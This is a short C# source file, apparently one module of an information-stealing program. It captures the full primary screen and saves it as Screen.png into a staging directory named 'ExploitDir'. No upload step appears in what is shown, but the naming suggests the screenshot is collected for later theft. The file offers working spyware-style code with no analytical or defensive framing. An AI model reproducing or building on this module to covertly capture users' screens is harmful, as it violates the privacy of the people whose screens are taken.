using System.Drawing;
using System.Drawing.Imaging;

namespace Checker
{
    class Screen
    {
        public static void GetScreen()
        {
            var SDir = Help.ExploitDir;
            var width = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width;
            var height = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height;
            var bitmap = new Bitmap(width, height);
            Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            bitmap.Save(SDir + $"\\Screen.png", ImageFormat.Png);
        }
    }
}
